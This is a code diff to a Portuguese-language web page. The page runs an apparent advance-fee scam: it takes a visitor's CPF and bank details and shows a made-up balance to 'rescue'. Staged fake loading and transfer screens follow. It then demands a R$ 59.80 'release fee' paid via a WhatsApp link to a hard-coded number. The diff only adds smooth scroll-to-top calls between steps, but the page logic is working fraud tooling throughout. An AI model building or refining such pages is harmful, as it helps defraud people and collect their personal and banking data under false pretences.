@@ -237,7 +237,7 @@
                 <p class="text-xs mt-1">A taxa de liberação de <strong class="text-emerald-700 font-bold">R$ 59,80</strong> representa <strong>menos de 1%</strong> do valor total de <span id="valor-badge-taxa" class="font-mono font-bold text-emerald-700">R$ 0,00</span> que você vai resgatar!</p>
             </div>
 
-            <!-- Botão Pagar no WhatsApp (Usando <a> tag nativa para abrir perfeitamente no celular) -->
+            <!-- Botão Pagar no WhatsApp -->
             <a id="btn-whatsapp" href="#" onclick="clicarWhatsApp(event)" target="_blank"
                 class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-black py-4 rounded-xl transition duration-200 shadow-xl text-base flex items-center justify-center space-x-2 mb-5 cursor-pointer animate-pulse text-center no-underline">
                 <span>💬 Pagar Taxa no WhatsApp</span>
@@ -264,6 +264,11 @@
 
     <!-- LÓGICA EM JAVASCRIPT -->
     <script>
+        // Função auxiliar para subir o scroll para o topo suavemente
+        function subirParaTopo() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
         // NÚMERO DO WHATSAPP CONFIGURADO
         const listaWhatsapps = [
             "5516982516678"
@@ -389,6 +394,7 @@
             iframe.src = "https://www.youtube.com/embed/saO1_TtC9mI?autoplay=1&mute=0&enablejsapi=1";
 
             document.getElementById('step-video').classList.remove('hidden');
+            subirParaTopo();
             iniciarContadorVideo();
         }
 
@@ -419,16 +425,19 @@
             document.getElementById('print-cpf-1').innerText = cpfGlobal;
             document.getElementById('valor-encontrado-1').innerText = valorGlobal;
             document.getElementById('step-extrato-1').classList.remove('hidden');
+            subirParaTopo();
         }
 
         function irParaFormularioConta() {
             document.getElementById('step-extrato-1').classList.add('hidden');
             document.getElementById('loading-text').innerText = "Carregando ambiente seguro de repasse...";
             document.getElementById('loading-screen').classList.remove('hidden');
+            subirParaTopo();
 
             setTimeout(() => {
                 document.getElementById('loading-screen').classList.add('hidden');
                 document.getElementById('step-conta').classList.remove('hidden');
+                subirParaTopo();
             }, 3000);
         }
 
@@ -458,6 +467,7 @@
             document.getElementById('step-conta').classList.add('hidden');
             document.getElementById('loading-text').innerText = "Vinculando dados bancários ao CPF...";
             document.getElementById('loading-screen').classList.remove('hidden');
+            subirParaTopo();
 
             setTimeout(() => {
                 document.getElementById('loading-screen').classList.add('hidden');
@@ -465,12 +475,14 @@
                 document.getElementById('print-conta-2').innerText = contaGlobal;
                 document.getElementById('valor-encontrado-2').innerText = valorGlobal;
                 document.getElementById('step-extrato-2').classList.remove('hidden');
+                subirParaTopo();
             }, 3000);
         }
 
         function iniciarTransferencia() {
             document.getElementById('step-extrato-2').classList.add('hidden');
             document.getElementById('loading-transferencia').classList.remove('hidden');
+            subirParaTopo();
 
             setTimeout(() => {
                 document.getElementById('loading-transferencia').classList.add('hidden');
@@ -482,6 +494,7 @@
                 document.getElementById('valor-badge-detalhe').innerText = valorGlobal;
 
                 document.getElementById('step-taxa').classList.remove('hidden');
+                subirParaTopo();
                 iniciarCronometroTaxa();
             }, 15000);
         }
@@ -516,7 +529,6 @@
             let textoMensagem = `Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
             let mensagemCodificada = encodeURIComponent(textoMensagem);
 
-            // Define o link correto dinamicamente no elemento <a>
             let linkZap = `https://wa.me/${numeroEscolhido}?text=${mensagemCodificada}`;
             event.currentTarget.href = linkZap;
         }
